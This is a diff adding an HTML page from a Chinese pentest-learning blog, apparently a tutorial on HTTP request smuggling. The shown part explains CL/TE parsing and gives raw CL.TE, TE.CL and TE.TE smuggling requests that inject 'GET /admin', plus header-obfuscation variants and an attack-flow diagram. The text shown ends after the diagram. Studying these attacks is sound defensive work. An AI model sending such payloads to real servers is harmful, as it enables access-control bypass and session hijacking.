@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一、引言HTTP请求走私（HTTP Request Smuggling）是一种利用HTTP协议解析差异的攻击技术，最早由Watchfire（后被IBM收购）的研究员在2005年提出。随着现代Web架构中普遍采用”前端代理&#x2F;负载均衡 + 后端应用服务器”的多层部署模式，这一攻击手段在近年来越发受到安全社区的关注，连续多年入选OWASP Top 10。 其核心原理在于：当链路上的不同HTTP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP请求走私攻击">
+<meta property="og:url" content="https://congliang.github.io/HTTP-request-smuggling/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="一、引言HTTP请求走私（HTTP Request Smuggling）是一种利用HTTP协议解析差异的攻击技术，最早由Watchfire（后被IBM收购）的研究员在2005年提出。随着现代Web架构中普遍采用”前端代理&#x2F;负载均衡 + 后端应用服务器”的多层部署模式，这一攻击手段在近年来越发受到安全社区的关注，连续多年入选OWASP Top 10。 其核心原理在于：当链路上的不同HTTP">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-06-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.892Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/HTTP-request-smuggling/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/HTTP-request-smuggling/","path":"HTTP-request-smuggling/","title":"HTTP请求走私攻击"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HTTP请求走私攻击 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">一、引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81HTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%EF%BC%9AContent-Length-%E4%B8%8E-Transfer-Encoding"><span class="nav-number">2.</span> <span class="nav-text">二、HTTP协议基础：Content-Length 与 Transfer-Encoding</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-Content-Length%EF%BC%88CL%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 Content-Length（CL）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Transfer-Encoding%EF%BC%88TE%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 Transfer-Encoding（TE）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%AD%A7%E4%B9%89%E6%80%A7%E7%9A%84%E6%A0%B9%E6%BA%90"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 歧义性的根源</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.</span> <span class="nav-text">三、三大经典攻击类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-CL-TE-%E8%B5%B0%E7%A7%81"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 CL.TE 走私</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-TE-CL-%E8%B5%B0%E7%A7%81"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 TE.CL 走私</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-TE-TE-%E8%B5%B0%E7%A7%81"><span class="nav-number">3.3.</span> <span class="nav-text">3.3 TE.TE 走私</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">4.</span> <span class="nav-text">四、攻击流程图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">5.</span> <span class="nav-text">五、实战利用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%EF%BC%88Cache-Poisoning%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 缓存投毒（Cache Poisoning）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E8%AF%B7%E6%B1%82%E5%8A%AB%E6%8C%81%EF%BC%88Request-Hijacking%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 请求劫持（Request Hijacking）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-WAF-%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87"><span class="nav-number">5.3.</span> <span class="nav-text">5.3 WAF &#x2F; 安全防护绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81Burp-Suite-%E5%B7%A5%E5%85%B7%E8%BE%85%E5%8A%A9"><span class="nav-number">6.</span> <span class="nav-text">六、Burp Suite 工具辅助</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-HTTP-Request-Smuggler-%E6%8F%92%E4%BB%B6"><span class="nav-number">6.1.</span> <span class="nav-text">6.1 HTTP Request Smuggler 插件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-Turbo-Intruder-%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8"><span class="nav-number">6.2.</span> <span class="nav-text">6.2 Turbo Intruder 高级利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81HTTP-2-%E9%99%8D%E7%BA%A7%E8%B5%B0%E7%A7%81"><span class="nav-number">7.</span> <span class="nav-text">七、HTTP&#x2F;2 降级走私</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E4%B8%BA%E4%BB%80%E4%B9%88-HTTP-2-%E4%BC%9A%E5%B8%A6%E6%9D%A5%E6%96%B0%E7%9A%84%E8%B5%B0%E7%A7%81%E9%A3%8E%E9%99%A9"><span class="nav-number">7.1.</span> <span class="nav-text">7.1 为什么 HTTP&#x2F;2 会带来新的走私风险</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-H2-CL-%E8%B5%B0%E7%A7%81"><span class="nav-number">7.2.</span> <span class="nav-text">7.2 H2.CL 走私</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-H2-TE-%E8%B5%B0%E7%A7%81"><span class="nav-number">7.3.</span> <span class="nav-text">7.3 H2.TE 走私</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">8.</span> <span class="nav-text">八、防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2"><span class="nav-number">8.1.</span> <span class="nav-text">8.1 架构层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E9%85%8D%E7%BD%AE%E5%B1%82%E9%9D%A2"><span class="nav-number">8.2.</span> <span class="nav-text">8.2 配置层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%9B%91%E6%8E%A7"><span class="nav-number">8.3.</span> <span class="nav-text">8.3 检测与监控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">九、总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/HTTP-request-smuggling/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HTTP请求走私攻击 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTTP请求走私攻击
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-06-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-06-15T08:00:00+08:00">2026-06-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>HTTP请求走私（HTTP Request Smuggling）是一种利用HTTP协议解析差异的攻击技术，最早由Watchfire（后被IBM收购）的研究员在2005年提出。随着现代Web架构中普遍采用”前端代理&#x2F;负载均衡 + 后端应用服务器”的多层部署模式，这一攻击手段在近年来越发受到安全社区的关注，连续多年入选OWASP Top 10。</p>
+<p>其核心原理在于：当链路上的不同HTTP解析器对请求边界的理解不一致时，攻击者可以在一个”正常”请求中嵌入另一个”走私”请求，从而干扰后续用户的正常请求，实现缓存投毒、请求劫持、安全防护绕过等高危攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌─────────┐     ┌─────────────────┐     ┌─────────────────┐</span><br><span class="line">│  客户端  │────▶│  前端（代理/CDN） │────▶│  后端（应用服务）  │</span><br><span class="line">└─────────┘     └─────────────────┘     └─────────────────┘</span><br><span class="line">                        ▲                        ▲</span><br><span class="line">                        │       解析差异！       │</span><br><span class="line">                        └────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、HTTP协议基础：Content-Length-与-Transfer-Encoding"><a href="#二、HTTP协议基础：Content-Length-与-Transfer-Encoding" class="headerlink" title="二、HTTP协议基础：Content-Length 与 Transfer-Encoding"></a>二、HTTP协议基础：Content-Length 与 Transfer-Encoding</h2><p>在深入攻击原理之前，有必要回顾HTTP&#x2F;1.1协议中两个关键的头部字段。</p>
+<h3 id="2-1-Content-Length（CL）"><a href="#2-1-Content-Length（CL）" class="headerlink" title="2.1 Content-Length（CL）"></a>2.1 Content-Length（CL）</h3><p><code>Content-Length</code> 头指明请求体的字节长度。接收方读取恰好该长度的数据作为请求体，剩余数据视为下一个请求的开端。这是一个简单且确定的方式，符合RFC 7230规范。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
+
+<p>服务器读取 “hello world”（11字节）后，认为该请求已结束。</p>
+<h3 id="2-2-Transfer-Encoding（TE）"><a href="#2-2-Transfer-Encoding（TE）" class="headerlink" title="2.2 Transfer-Encoding（TE）"></a>2.2 Transfer-Encoding（TE）</h3><p><code>Transfer-Encoding: chunked</code> 采用分块传输模式。请求体被拆分为若干块（chunk），每个块以十六进制的长度开头，后跟块数据，最终以 <code>0\r\n\r\n</code> 标识结束。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /upload HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5\r\n</span><br><span class="line">hello\r\n</span><br><span class="line">6\r\n</span><br><span class="line"> world\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>请求体 “hello world” 被分两段传输，第一个块长0x5字节，第二个块长0x6字节。</p>
+<h3 id="2-3-歧义性的根源"><a href="#2-3-歧义性的根源" class="headerlink" title="2.3 歧义性的根源"></a>2.3 歧义性的根源</h3><p>RFC 7230第3.3.3节明确指出：<strong>如果同时存在 Content-Length 和 Transfer-Encoding，必须优先使用 Transfer-Encoding</strong>。然而现实中，不同实现的处理方式可能完全不同：</p>
+<ul>
+<li><strong>前端A</strong>：严格遵守RFC，忽略Content-Length，按Transfer-Encoding解析。</li>
+<li><strong>后端B</strong>：优先使用Content-Length，忽略Transfer-Encoding。</li>
+<li><strong>后端C</strong>：同时读取两种头，可能导致混乱。</li>
+</ul>
+<p>这种解析差异，正是HTTP请求走私攻击的温床。</p>
+<h2 id="三、三大经典攻击类型"><a href="#三、三大经典攻击类型" class="headerlink" title="三、三大经典攻击类型"></a>三、三大经典攻击类型</h2><p>根据前端和后端对不同头部的处理方式，HTTP请求走私可以分为以下三类。</p>
+<h3 id="3-1-CL-TE-走私"><a href="#3-1-CL-TE-走私" class="headerlink" title="3.1 CL.TE 走私"></a>3.1 CL.TE 走私</h3><p><strong>场景</strong>：前端使用 <code>Content-Length</code> 确定请求边界，后端使用 <code>Transfer-Encoding</code> 解析。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable.example.com</span><br><span class="line">Content-Length: 35</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /admin HTTP/1.1\r\n</span><br><span class="line">Host: localhost\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>前端视角</strong>：<code>Content-Length: 35</code> → 读取全部35字节，认为这是<strong>一个</strong>完整请求。</li>
+<li><strong>后端视角</strong>：<code>Transfer-Encoding: chunked</code> → 遇到 <code>0\r\n\r\n</code> 后认为第一个请求结束；<code>GET /admin</code> 成为<strong>第二个</strong>被独立处理的请求。</li>
+</ul>
+<p>攻击效果：攻击者成功向后端注入了 <code>GET /admin</code> 请求，而该请求不会被前端记录或审计。</p>
+<h3 id="3-2-TE-CL-走私"><a href="#3-2-TE-CL-走私" class="headerlink" title="3.2 TE.CL 走私"></a>3.2 TE.CL 走私</h3><p><strong>场景</strong>：前端使用 <code>Transfer-Encoding</code> 解析，后端使用 <code>Content-Length</code> 确定边界。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable.example.com</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c\r\n</span><br><span class="line">GET /admin HTTP/1.1\r\n</span><br><span class="line">Host: localhost\r\n</span><br><span class="line">Content-Length: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>前端视角</strong>：<code>Transfer-Encoding: chunked</code> → 读取 <code>5c</code>（92字节）长的chunk，直到 <code>0\r\n\r\n</code>。这里 <code>5c</code> 是伪造的chunk长度标记，前端按分块协议读完。</li>
+<li><strong>后端视角</strong>：<code>Content-Length: 4</code> → 仅读取4字节（即 “5c\r\n”），剩下的数据 <code>GET /admin ...</code> 会被作为下一个独立请求处理。</li>
+</ul>
+<h3 id="3-3-TE-TE-走私"><a href="#3-3-TE-TE-走私" class="headerlink" title="3.3 TE.TE 走私"></a>3.3 TE.TE 走私</h3><p><strong>场景</strong>：前后端都使用 <code>Transfer-Encoding</code>，但通过构造畸形的TE头让其中一方忽略它，从而退回到 <code>Content-Length</code> 模式。</p>
+<p>常见的混淆手段包括：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked          # 无效值，被某些解析器忽略</span><br><span class="line">Transfer-Encoding : chunked          # 冒号前的空格导致解析失败</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked\r\n</span><br><span class="line"><span class="attribute">Transfer-encoding</span><span class="punctuation">: </span>chunked           # 大小写变化</span><br><span class="line"><span class="attribute">X</span><span class="punctuation">: </span>X\r\nTransfer-Encoding: chunked   # 前置无关头干扰</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable.example.com</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: cow</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c\r\n</span><br><span class="line">GET /admin HTTP/1.1\r\n</span><br><span class="line">Host: localhost\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>前端</strong>：可能只认第一个 <code>Transfer-Encoding: cow</code>（无效值，降级为CL），也可能先读到一个有效值后遇到混淆头。</li>
+<li><strong>后端</strong>：可能只识别最后一个 <code>Transfer-Encoding: chunked</code>，按分块传输解析。</li>
+</ul>
+<p>依赖目标的具体实现，灵活调整混淆策略。</p>
+<h2 id="四、攻击流程图"><a href="#四、攻击流程图" class="headerlink" title="四、攻击流程图"></a>四、攻击流程图</h2><p>下面以CL.TE走私为例，展示一次完整的攻击流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">攻击者                           前端代理                         后端服务器</span><br><span class="line">  │                                │                                │</span><br><span class="line">  │  POST / HTTP/1.1               │                                │</span><br><span class="line">  │  Content-Length: 35            │                                │</span><br><span class="line">  │  TE: chunked                   │                                │</span><br><span class="line">  │                                │                                │</span><br><span class="line">  │  0\r\n                         │                                │</span><br><span class="line">  │  \r\n                          │                                │</span><br><span class="line">  │  GET /admin HTTP/1.1\r\n       │                                │</span><br><span class="line">  │  Host: evil\r\n                │                                │</span><br><span class="line">  │  \r\n                          │                                │</span><br><span class="line">  ├───────────────────────────────▶│                                │</span><br><span class="line">  │                                │                                │</span><br><span class="line">  │                                │  按CL读取35字节→一个完整请求     │</span><br><span class="line">  │                                ├───────────────────────────────▶│</span><br><span class="line">  │                                │                                │</span><br><span class="line">  │                                │                                │  按TE分块解析</span><br><span class="line">  │                                │                                │  遇到0\r\n\r\n→第一个请求结束</span><br><span class="line">  │                                │                                │  GET /admin →第二个请求！</span><br><span class="line">  │                                │                                ├─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─▶</span><br><span class="line">  │                                │                                │  处理/admin请求</span><br><span class="line">  │                                │                                │</span><br><span class="line">  │                 ◀──────────────┤                                │</span><br><span class="line">  │  200 OK (正常响应)              │  响应合并                       │</span><br><span class="line">  │  ← ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ │                                │</span><br><span class="line">  │                                │                                │</span><br><span class="line">  │  受害者                          │                                │</span><br><span class="line">  │  GET / HTTP/1.1                │                                │</span><br><span class="line">  │  Cookie: session=xxx           │                                │</span><br><span class="line">  ├───────────────────────────────▶│                                │</span><br><span class="line">  │                                │                                │</span><br><span class="line">  │                                │  附加到走私请求后                │</span><br><span class="line">  │                                ├───────────────────────────────▶│</span><br><span class="line">  │                                │                                │</span><br><span class="line">  │                                │                                │  受害者请求被当作/admin的参数</span><br><span class="line">  │                                │                                │  返回攻击者可控内容</span><br></pre></td></tr></table></figure>
+
